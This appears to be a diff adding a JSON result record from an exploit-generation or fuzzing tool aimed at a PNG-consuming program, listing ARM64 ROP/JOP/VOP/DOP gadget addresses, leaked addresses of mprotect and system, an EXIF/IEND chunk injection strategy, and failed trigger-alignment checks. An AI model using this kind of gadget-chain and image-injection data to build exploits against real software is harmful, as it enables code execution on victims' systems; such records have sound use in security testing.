@@ -1,0 +1,64 @@
+{
+  "file": "sample_0.png.png_consumer.optimization_bypass.retry2.png",
+  "fuzz_type": "optimization_bypass",
+  "chain_type": "ROP",
+  "unique_id": "pwned_png_consumer_optimization_bypass_1783708057_2",
+  "attack_chain": [
+    "ROP_OPTIMIZATION_BYPASS",
+    "JOP_OPTIMIZATION_BYPASS",
+    "VOP_OPTIMIZATION_BYPASS",
+    "DOP_OPTIMIZATION_BYPASS"
+  ],
+  "leaked_addresses": {
+    "mprotect": "0xe4c4d8bf7c00",
+    "system": "0xe4c4d8b5cec4",
+    "payload": "0xb6ae3c170040",
+    "pop_x0_x1_x2_ret": "0xb6ae3c151798",
+    "ldp_x29_x30": "0xb6ae3c1517ac",
+    "pop_x0_x1_x2_x30_br_x0": "0xb6ae3c1517bc",
+    "jump_x0": "0xb6ae3c1517d0",
+    "load_mprotect_x3": "0xb6ae3c151838",
+    "load_payload_x0": "0xb6ae3c151850",
+    "br_x3": "0xb6ae3c151868",
+    "ldr_x0_x1_br_x0": "0xb6ae3c151874",
+    "mov_x0_x1_br_x0": "0xb6ae3c151884",
+    "ldr_x1_x0_br_x1": "0xb6ae3c151894",
+    "mov_x1_x0_br_x1": "0xb6ae3c1518a4",
+    "pop_x0_x1_ret": "0xb6ae3c1518b4",
+    "pop_x0_ret": "0xb6ae3c1518c4",
+    "pop_x1_ret": "0xb6ae3c1518d4",
+    "ldr_x0_sp_br_x0": "0xb6ae3c1518e4",
+    "ldr_x1_sp_br_x1": "0xb6ae3c1518f4",
+    "gadget_vop_fmov": "0xb6ae3c151954",
+    "gadget_vop_ldr_str_q0": "0xb6ae3c151968",
+    "gadget_mov_x0_x1_br_x0": "0xb6ae3c151884",
+    "gadget_ldr_x0_x1_br_x0": "0xb6ae3c151874"
+  },
+  "chunk_injection_strategy": "exif_iend",
+  "instrumentation_validation": {
+    "valid": false,
+    "issues": [],
+    "warnings": [],
+    "embeddings": {
+      "ROP chain": 2831854,
+      "JOP chain": 2831930,
+      "VOP chain": 2831998,
+      "DOP chain": 2832122
+    },
+    "missing_triggers": [
+      "INJECTED_PAYLOAD marker missing"
+    ],
+    "payload_integrity": true,
+    "doubtful_fitness_markers": []
+  },
+  "trigger_alignment": {
+    "aligned": false,
+    "trigger_offset": -1,
+    "payload_offset": -1,
+    "gap_bytes": -1,
+    "alignment_quality": "unknown",
+    "recommendations": [],
+    "trigger_type": "optimization_bypass",
+    "payload_slide": 0
+  }
+}
